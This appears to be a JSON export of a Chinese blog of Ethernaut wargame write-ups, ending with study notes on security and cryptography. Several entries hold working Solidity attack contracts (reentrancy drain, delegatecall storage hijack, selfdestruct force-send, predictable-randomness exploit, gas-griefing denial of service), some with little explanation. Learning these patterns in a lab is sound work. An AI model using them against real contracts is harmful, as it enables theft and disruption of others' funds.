[{"title":"就像冬天下雪，不算多特别","url":"//news/","content":"\n\n","categories":["Introduce"],"tags":["Arknights"]},{"title":"Ethernaut Test-2","url":"/2024/08/11/ETH02/","content":"Test 2-Fallout// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n\n题目的要求是 获取该合约的所有权\n\n观察这个合约，我们可以发现该合约使用的 solidity 版本为 0.6.0，而在这个版本中我们要声明一个构造函数的方式和 0.8 版本中的方式是不同的\n//0.8版本及以上contract Example&#123;\tconstructor() &#123;&#125;&#125;//0.6版本（包含以下）contract Example&#123;\tfunction Example() &#123;\t&#125;&#125;//即在0.6这个版本中，我们需要构造函数的名称与合约的名称一致\n\n那么在这道题中，有的盲生可能就发现了华点\n\n我们的合约名称与“构造”的这个函数名称并不一致！一个是 Fallout，一个是 Fal1out。也就是说，这并不是一个构造函数，而是一个普通函数，这也是整个合约报错的原因！\n\n在这个函数中，owner 被设置为部署合约的人，那么怎么获取合约的所有权呢\n\n\n因为这是一个可以调用的公用函数，所以我们可以调用它，这样就能获得合约的所有权\n我们要声明一个接口，用于调用这个公用函数 Fal1out\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8;interface Fallout &#123;    function owner() external view returns(address);    function Fal1out() external payable;&#125;\n\n\n回到 eth 靶场，打开浏览器控制台获取合同的地址\n在 At Address 中填入获得到的合同地址，并部署合约\n调用 Fal1out 这个函数，等待交易完成后查看 owner 是否被更改为我们的地址\n完成解题\n\n\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-1","url":"/2024/08/11/ETH01/","content":"Test 1-Fallback// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n\n题目的要求是 1.获取该合约的所有权 2.将合约中的余额清零\n\n那么我们一个一个来\n1.首先是获取合约所有权，我们可以看到 owner 这个状态变量，在最后一行中的\nowner = msg.sender;//说明要获得这个合约的所有权，我们必须要向其发送&gt;=0的ether//合约中的contributions[msg.sender]给我提供了一个方向，就是去寻找这个contribution的状态变量，果然我找到了一个函数contribute，通过调用这个函数，我们就可以向该合约发送ether，接着再调用receive函数，这样就能将合约的拥有者设置为我们自己\n\n2.然后是将合约中的余额清零，这个好办，在完成第一步后直接调用 withdraw 函数就 ok 了\n\n注意事项\n\n在部署合约前，在 eth 靶场的界面用 f12 打开控制台输入 contract.address 获得部署地址，部署时在“At Address”这一栏中填入\n在部署完成后的界面中，并没有 receive 这个按钮，这个时候通过 low level interractions 功能，再次发送一个 eth，调用 receive 函数\n上述操作完成后记得验证 owner 是否已经被更改为我们的地址\n\n\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-3","url":"/2024/08/11/ETH03/","content":"Test 3-Coin Flip// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n\n\n题目的要求是 “猜硬币”，并连续 10 次猜对结果\n\n\n分析这段合约的时候我们看出，在我们调用 flip 这个函数时，consecutiveWins 会递增。consecutiveWins 增加的条件是输入的猜测结果 guess 等于 合约内部执行的计算结果 side\n\n如果我们的猜测结果连续十次与变量 side 相等，就赢得了这个挑战\n\n我们先创建一个名为 hack 的合约，在这个合约中传入 coinflip 的地址，将其命名为 target\n再建立一个构造函数，用来设定 target 变量\ncontract Hack &#123;    CoinFlip private immutable target;    constructor(address _target) &#123;        target = CoinFlip(_target);    &#125;\n\n接下来我们声明一个函数，并连续调用它十次，这样可以连续十次增加胜利次数\n我们命名这个函数为 flip\nfunction flip() external &#123;      bool guess = _guess(); //这里调用一个内部函数_guess，用来猜测结果      require(target.flip(guess), &quot;guess failed&quot;); //用require来判定结果是否正确    &#125;function _guess() private view returns(bool)&#123;//那么问题来了，怎么才能保证猜测结果始终正确呢&#125;\n\n我们翻一下源代码，发现了计算猜测结果的函数，删去不需要的部分后，放入_guess 这个内部函数中\n得到的结果\nfunction flip() external &#123;      bool guess = _guess();      require(target.flip(guess), &quot;guess failed&quot;);    &#125;    function _guess() private view returns(bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;    &#125;    //这里的计算过程有个FACTOR，我们把源代码中的这个值粘贴到hack合约中，得到最后的结果\n\ncontract Hack &#123;    CoinFlip private immutable target;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(address _target) &#123;        target = CoinFlip(_target);    &#125;    function flip() external &#123;      bool guess = _guess();      require(target.flip(guess), &quot;guess failed&quot;);    &#125;    function _guess() private view returns(bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;    &#125;&#125;\n\n这个时候再连续调用十次 flip 函数，即可完成这个挑战\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-4","url":"/2024/08/11/ETH04/","content":"Test 4-Telephone// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n%localappdata%\n\n目标：获取合约的所有权\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n我们找到其中的changeOwner函数，并寻找 owner 在哪些地方能被变更，然后我们发现在构造函数constructor里将 owner 设置为这个合约的部署者\n在changeOwner函数中，它接受一个输入，并将 owner 这个状态变量设置为新的所有者的地址\n而它需要满足条件**tx.origin !&#x3D; msg.sender**\n什么意思呢 我们回顾一下：\n\ntx.origin 是发起交易的账户\nmsg.sender 是当前直接调用这个合约的即时账户\n\n要完成目标，我们可以先创建一个攻击合约，用来调用 Telephone 合约，这样 tx.origin 将是我们的账户，而 msg.sender 将是攻击合约，以此来达成条件**tx.origin !&#x3D; msg.sender**\n编写攻击合约contract Hack&#123;\tconstructor(address _target)&#123;\t\tTelephone(_target).changeOwner(msg.sender);\t&#125;&#125;\n\n之后我们向 Telephone 合约的地址部署 Hack 合约，即可完成挑战\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-5","url":"/2024/08/11/ETH05/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IToken &#123;    function balanceOf(address) external view returns (uint256);    function transfer(address to , uint256 value) external returns (bool);&#125;contract Hack &#123;    constructor(address _target) &#123;        IToken(_target).transfer(msg.sender,1);    &#125;&#125;\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-6","url":"/2024/08/11/ETH06/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;  address public owner;  constructor(address _owner) &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-7","url":"/2024/08/11/ETH07/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &#123;/*                   MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =ø= / (______)__m_m)*/&#125;//可能我们需要往这个合约里发送一些ETH？//——&gt;创建一个转账合约(错误)//这是一个空合约，你创建牛魔呢，这里提到一个新名词//selfdestruct —— 自毁合约功能 //通过这个功能删除一个合约，然后这个合约内所有的余额将被强制发送到另一个合约contract Hack &#123;    constructor(address payable _target) payable &#123;        selfdestruct(_target);    &#125;&#125;\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-8","url":"/2024/08/11/ETH08/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;  bool public locked;  bytes32 private password; //这是一个私有变量，所以我们不能直接获取密码 但是可以访问它  constructor(bytes32 _password) &#123;    locked = true;    password = _password;  &#125;  function unlock(bytes32 _password) public &#123;    if (password == _password) &#123;      locked = false;    &#125;  &#125;&#125;//当合约被部署时，lock被设置为true//想办法将locked设置为false ---unlock函数//为了获取password，我们需要返回访问Web3库//password 0x412076657279207374726f6e67207365637265742070617373776f7264203a29\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-9","url":"/2024/08/11/ETH09/","content":"\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-10","url":"/2024/08/11/ETH10/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IReentrancy &#123;  function donate(address) external payable;  function withdraw(uint256) external;&#125;contract Hack &#123;  IReentrancy private immutable target;  constructor(address _target) &#123;    target = IReentrancy(_target);  &#125;  function attack() external payable &#123;    target.donate&#123;value: 1e18&#125;(address(this)); //我们所donate的余额。再执行withdraw，以实现重入攻击    target.withdraw(1e18);    require(address(target).balance == 0, &#x27;target balance &gt; 0&#x27;); //当我们把所有的eth取走后    selfdestruct(payable(msg.sender)); //提取完后，攻击合约进行自毁  &#125;  receive() external payable &#123;    uint amount = min(1e18, address(target).balance); //将amount设置为最大的balance，也就是原合约中所有的资产    if (amount &gt; 0) &#123;      target.withdraw(amount); //在amount没有到0的情况下一直执行，直到提取完所有的资金    &#125;  &#125;  function min(uint x, uint y) private pure returns (uint) &#123;    //这个函数将会返回x，y中的最小值    return x &lt;= y ? x : y;  &#125;&#125;\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-11","url":"/2024/08/11/ETH11/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123;    function isLastFloor(uint) external returns (bool);&#125;contract Hack &#123;    Elevator private immutable target;    uint private count;    constructor(address _target) &#123;        target = Elevator(_target);    &#125;    function pwn() external &#123;        //部署pwn函数，在pwn函数中我们已经验证了调用结果是否为true        target.goTo(1);        require(target.top(), &quot;not top&quot;);    &#125;    function isLastFloor(uint) external returns (bool) &#123;        //需要创建一个count函数，来记录调用isLastFloor这个函数的次数        count++;        return count &gt; 1; //这样才能做到第一次调用返回false，第二次返回true        //实现的方式 第一次count将等于1返回false，第二次count为2大于1返回true    &#125;&#125;contract Elevator &#123;    bool public top; //top 是一个 bool 变量，我们需要将其设置为 true    uint public floor;    function goTo(uint _floor) public &#123;        //一个可调用的函数，它接收一个 floor 输入        Building building = Building(msg.sender); //上面的 interface 接口表明，最后会返回一个 bool，我们要做的就是让这个 bool 为 true        if (!building.isLastFloor(_floor)) &#123;            //而building，是一个加载调用者地址的接口。稍后，该接口会两次调用isLastFloor函数            floor = _floor;            top = building.isLastFloor(floor); //要达成这个挑战，第一次对isLastFloor的调用必须返回false，第二次必须返回true        &#125;    &#125;&#125;//挑战目标：到达 top floor","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-10-interface","url":"/2024/08/11/ETH10-interface/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Reentrance &#123;  using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    //该 withdraw 函数：一个典型的重入攻击（详情参看我在 gitee 中保存的重入攻击文档）    if (balances[msg.sender] &gt;= _amount) &#123;      //如果 msg.sender 的余额大于等于指定的金额，则可以取出它们      (bool result, ) = msg.sender.call&#123;value: _amount&#125;(&#x27;&#x27;); //当调用 msg.sender.call 时，将会把输入的金额从合约中发送出去 然后更新余额      if (result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;//挑战的目标是盗取这个合约中的所有资金//重入攻击，不断调用取走资金的函数，直到所有的资产都被搬空\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-12","url":"/2024/08/11/ETH12/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//每个私有变量都有一个slot来储存它，每个slot可以储存32个字节的数据，我们可以通过uint的类型判断其占用几个字节，再计算出这个状态变量会被储存在哪个slot当中contract Privacy &#123;  //slot 0  bool public locked = true;  //slot 1  uint256 public ID = block.timestamp;  //slot 2  uint8 private flattening = 10;  //slot 2  uint8 private denomination = 255;  //slot 2  uint16 private awkwardness = uint16(block.timestamp);  //slot 3(开辟了一个新的数组) 接下来该数组中的变量被依次储存到 slot 4 -&gt; slot 5（第二个元素） 我们可以使用web3.js库来获取数据  bytes32[3] private data; //由于该变量是私有的，所以不能直接调用来获取key  constructor(bytes32[3] memory _data) &#123;    data = _data;  &#125;  function unlock(bytes16 _key) public &#123;    //这里是我们能调用的一个函数 unlock    require(_key == bytes16(data[2])); //要调用它，需要输入一个参数key，这个参数key为状态变量data中的第二个元素    locked = false;    //通过调用web3.js库我们获得了key ‘0xa6e187e9680ec7e8c6e6dd0b474a9185’  &#125;  /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU  */&#125;//挑战的目标是解锁这个合约，也就是需要将locked这个变量的值设置为false//**调用web3.js库的过程如下**//图片没了 到时候再看吧\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-13","url":"/2024/08/11/ETH13/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Hack &#123;  function enter(address _target, uint gas) external &#123;    GatekeeperOne target = GatekeeperOne(_target);    //k = uint64(_gateKey) //需要创建一个满足下列条件的gateKey    uint16 k16 = uint16(uint160(tx.origin));    //uint32(k) != k //这是剩下的需要满足的条件 &gt;&gt; 我们注意到k=uint64 所以如果我们在这个数字的最左边加上1 然后将其转换为uint32类型 这样最左边加的1将被移除 两边不再相等    //uint32(k) == uint16(uint160(tx.origin)) //我们需要定义一个满足这个条件的k    //uint32(k) == uint16(k) //由于转换为了uint16 所以这个条件也满足了    uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); //最后一步是将这个uint64转换为bytes8    bytes8 key = bytes8(k64);    require(gas &lt; 8191, &#x27;gas &gt;= 8191&#x27;);    require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &#x27;failed&#x27;); //将key作为input传入 在之前要先定义    //这样就成功完成了GateOne  &#125;&#125;contract GatekeeperOne &#123;  address public entrant;  //三层的gate，也就是有三重条件  modifier gateOne() &#123;    require(msg.sender != tx.origin); //msg.sender是调用合约的地址 tx.origin是发起交易的账户    _; //要使这两个地址不相等，我们只需要创建一个hack合约调用enter函数 这样msg.sender就是hack合约的地址  &#125;  modifier gateTwo() &#123;    require(gasleft() % 8191 == 0); //要求 在执行这部分代码时剩余的gas数量必须能被8191整除    _;    //在hack合约里加入一个测试 并多次运行测试 使用不同的gas量直到通过gatetwo\\    //经过计算遍历后 我们需要的gas数量是256  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &#x27;GatekeeperOne: invalid gateThree part one&#x27;);    require(uint32(uint64(_gateKey)) != uint64(_gateKey), &#x27;GatekeeperOne: invalid gateThree part two&#x27;);    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &#x27;GatekeeperOne: invalid gateThree part three&#x27;);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;//Target : Make it past the gatekeeper and register as an entrant","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-14","url":"/2024/08/11/ETH14/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//0x93f7daCE54CEE6E71138E4F633DD7BD143D13aa2contract Hack &#123;  constructor(GatekeeperTwo target) &#123;    uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); //设置一个变量s代替这个等式的前半部分    uint64 k = s ^ type(uint64).max;    // ^ uint64(key) == type(uint64).max)  //使用_gateKey进行异或运算 这样得到的结果命名为key 在这里面    //max = 11...11    //s ^ key = max 异或运算    //s ^ s ^ key = key = s ^ max    // 异或运算只有在两个数的其中一个数为一时才返回1    // a ^ a ^ b = b    bytes8 key = bytes8(k); //这样就通过了gateThree    require(target.enter(key), &#x27;failed&#x27;);  &#125;&#125;contract GatekeeperTwo &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;    //这个也同上一题  &#125;  modifier gateTwo() &#123;    uint x;    assembly &#123;      x := extcodesize(caller())    &#125;    require(x == 0); //要求extcodesize...必须等于零 （好像意思是在说msg.sender不能是一个合约？）    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;    //我们需要达成gate123的要求 enter这个函数接收一个key  &#125;&#125;//类似于上一题，需要我们成功注册通行证，也就是要将状态变量entrant设置为我们的账户","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-16","url":"/2024/08/11/ETH16/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//target: claim ownership of the instance.contract Hack &#123;    address public timeZone1Library;    address public timeZone2Library;    address public owner;    function attack(        Preservation target //solidity在这里会用接口Preservation加载目标地址 而不是将Pre...合约的地址传递到函数中    ) external &#123;        target.setFirstTime(uint256(uint160(address(this))));        target.setFirstTime(uint256(uint160(msg.sender)));        require(target.owner() == msg.sender, &quot;hack failed&quot;);    &#125;    function setTime(uint _owner) external &#123;        owner = address(uint160(_owner));    &#125;&#125;contract Preservation &#123;    // public library contracts    address public timeZone1Library;    address public timeZone2Library;    address public owner;    uint256 storedTime;    // Sets the function signature for delegatecall    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));    constructor(        address _timeZone1LibraryAddress,        address _timeZone2LibraryAddress    ) &#123;        timeZone1Library = _timeZone1LibraryAddress;        timeZone2Library = _timeZone2LibraryAddress;        owner = msg.sender; //唯一可以找到的设置owner的位置 看一下下方函数有什么可以调用的    &#125;    // set the time for timezone 1    function setFirstTime(uint256 _timeStamp) public &#123;        //如果我们调用这个函数 它将更新timeZone1Library的地址        timeZone1Library.delegatecall(            abi.encodePacked(setTimeSignature, _timeStamp)        ); //delegatecall的概念 合约A（主）通过合约B调用合约C    &#125; //在这个函数中的表现形式就是通过委托调用setTimeSignature函数（合约B）-&gt; 再调用setTime函数    // set the time for timezone 2    function setSecondTime(uint256 _timeStamp) public &#123;        timeZone2Library.delegatecall(            abi.encodePacked(setTimeSignature, _timeStamp)        );    &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;    // stores a timestamp    uint256 storedTime;    function setTime(uint256 _time) public &#123;        storedTime = _time;    &#125;&#125;","categories":["Ethernaut"],"tags":["Test"]},{"title":"写在前面","url":"/2024/08/12/ETH-index/","content":"写在前面由于本人在写ethernaunt靶场的时候还没搭博客，所以很多解题步骤都是在注释里写的（尤其是后期的一些题），有的时候很水甚至做完了都没几行注释，导致回头来看的时候又看不懂了（）总之以后写在博客上的内容都会更详细，并且题解也是必须精细的，不说一天一更也至少一周三到四更吧，believe就对了！\n","categories":["Ethernaut"],"tags":["introduce"]},{"title":"Ethernaut Test-21","url":"/2024/08/11/ETH21/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//get the item from the shop for less than the price asked//set isSold = true//set price &lt; 100interface Buyer &#123;    function price() external view returns (uint256);&#125;contract Shop &#123;    uint256 public price = 100;    bool public isSold; //初始为false    function buy() public &#123;        Buyer _buyer = Buyer(msg.sender);        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;            isSold = true;            price = _buyer.price(); //再一次调用了price函数        &#125;    &#125;&#125;contract Hack &#123;    Shop private immutable target;    constructor(address _target) &#123;        target = Shop(_target);    &#125;    function pwn() external &#123;        target.buy();        require(target.price() == 99, &quot;price != 99&quot;);    &#125;    function price() external view returns (uint) &#123;        if (target.isSold()) &#123;            //因为如果这个函数的值为true 说明第一次已经调用完了            //第二次调用为了达成目标条件 需要小于100            return 99;        &#125;        //第一次调用必须返回100 因为要满足if里的条件        return 100;    &#125;&#125;","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-17","url":"/2024/08/11/ETH17/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// recover (or remove) the 0.001 ether from the lost contract address.//找到合约的地址-&gt;从这恢复0.01个ethcontract Dev &#123;    function recover(address sender) external pure returns (address) &#123;        address addr = address(            uint160(                uint256(                    keccak256(                        abi.encodePacked(                            bytes1(0xd6),                            bytes1(0x94),                            sender,                            bytes1(0x01)                        )                    )                )            )        );        return addr;    &#125;&#125;contract Reycover &#123;    //generate tokens    function generateToken(string memory _name, uint256 _initialSupply) public &#123;        new SimpleToken(_name, msg.sender, _initialSupply);    &#125;    //通过公式计算发送合约的地址&#125;contract SimpleToken &#123;    string public name;    mapping(address =&gt; uint256) public balances;    // constructor    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;        name = _name;        balances[_creator] = _initialSupply;    &#125;    // collect ether in return for tokens    receive() external payable &#123;        balances[msg.sender] = msg.value * 10;    &#125;    // allow transfers of tokens    function transfer(address _to, uint256 _amount) public &#123;        require(balances[msg.sender] &gt;= _amount);        balances[msg.sender] = balances[msg.sender] - _amount;        balances[_to] = _amount;    &#125;    // clean up after ourselves    function destroy(address payable _to) public &#123;        selfdestruct(_to); //合约自毁后会强制将这个合约里的eth发送到另一个合约 这里的(_to)就是要发送到的地址 回到第一步    &#125;&#125;","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-20","url":"/2024/08/11/ETH20/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//deny the owner from withdrawing funds when they call withdraw()contract Hack &#123;    constructor(Denial target) &#123;        target.setWithdrawPartner(address(this)); //接下来，当有人调用withdraw这个函数时 会将partner设置为Hack合约    &#125;    fallback() external payable &#123;        assembly &#123;            invalid() //执行这段代码时将消耗合约中所有的gas 这样的话 payable(owner).transfer(amountToSend);这段代码就会因为gas不够而无法被执行        &#125;    &#125;&#125;contract Denial &#123;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint256 timeLastWithdrawn;    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public &#123;        partner = _partner;    &#125; //从这里可以知道 如果我们有办法把partner设置为我们的合约 就可以阻止withdraw合约给owner发送资金    // withdraw 1% to recipient and 1% to owner    function withdraw() public &#123;        //当有人调用withdraw函数时 它将一些资金发送给所有者(owner) 如何拒绝这个操作？        uint256 amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);        payable(owner).transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] += amountToSend;    &#125;    // allow deposit of funds    receive() external payable &#123;&#125;    // convenience function    function contractBalance() public view returns (uint256) &#123;        return address(this).balance;    &#125;&#125;","categories":["Ethernaut"],"tags":["Test"]},{"title":"区块链安全基础 前三章知识总结","url":"/2024/11/05/Security_C1-3/","content":"C1 信息安全基础知识信息安全的特征\n保密性\n\n保密性是指信息不泄漏给非授权的个人、实体和过程，或供其使用的特性\n\n\n完整性\n\n完整性是指信息未经授权不能被修改、不被破坏、不被插入、不延迟、不乱序和不丢失的特性。对网络信息安全进行攻击其最终目的就是破坏信息的完整性。\n\n\n可用性\n\n可用性是指合法用户访问并能按要求顺序使用信息的特性，即保证合法用户在需要时可以访问到信息及相关资产。\n\n\n可控性\n\n可控性是指授权机构对信息的内容及传播具有控制能力的特性，可以控制授权范围内的信息流向以及方式。\n\n\n可审查性\n\n在信息交流过程结束后，通信双方不能抵赖曾经做出的行为，也不能否认曾经接收到对方的信息\n\n\n\n信息安全应包含三层含义\n系统安全（实体安全），即系统运行的安全\n系统中信息的安全，即通过对用户权限的控制、数据加密等确保信息不被非授权者获取和篡改。\n管理安全，即综合运用各种手段对信息资源和系统运行安全进行有效的管理。\n\n赛博空间安全\n赛博安全具有四大特性\n\n\n网络融合性：互联网，电信网络，广播电视网络，物联网IoT等 \n终端多样性：智能手机，电视，PC，IPAD等；\n内容多样化：云计算，社交网络，对等网络服务等；\n领域广泛性：涉及政治，经济，文化。\n\n\n网络安全的结构层次包括：物理安全、安全控制和安全服务。\n\n信息安全服务与目标主要表现在系统的保密性、完整性、真实性、可靠性、可用性、不可抵赖性等方面。\n\n\n安全策略\n最小特权原则\n最小泄露原则\n多级安全策略\n\n\nC2 密码学基础\n密码学分为密码分析和密码编码学两个板块\n\n密码分析 是破译密码的科学和技术\n密码编码学 是密码体制的设计学\n\n\n密码体制是密码技术中最为核心的一个概念。\n\n所谓密码体制，是指一组规则、算法、函数或程序，使保密通信双方能够正确地、容易地进行加密和解密。\n\n一个完整的保密通信系统由密码体制（包括密码算法以及所有可能的明文、密文和密钥）、信源、信宿和攻击者构成\n\n\n\n\n明文空间P ：全体明文的集合\n密文空间C ：全体密文的集合\n密钥空间K ：全体密钥的集合\n加密算法E ：加密密钥控制的加密变换的集合\n解密算法D ：解密密钥控制的解密变换的集合\n\n\n对称密码模型\n发送方通过加密算法根据输入的消息P和密钥K生成密文 \n\n即\n\n接收方通过解密算法根据输入的密文C和密钥K恢复明文P\n\n即\n对称加密算法的三个弱点\n分发困难\n密钥管理困难\n无法源认证\n\n对称加密算法的优点：\n加、解密处理速度快； \n\n保密度高。\n\n\n\n非对称密码模型\n基于单项陷门函数 \n给定x，计算y  f(x)是容易的；\n给定y，计算x使y &#x3D;某个值是困难的\n存在，已知  时，对给定 的任何 y，若相应的x存在，则计算x使x  f-1 (y)是容易的\n\n非对称加密算法的三个优点\n密钥分发简单；\n密钥管理便捷；\n可以实现签名。\n\n非对称加密算法的缺点\n加密，解密处理速度较慢\n\n同等安全强度下公钥密码体制的密钥位数要求多一些\n\n\nT1 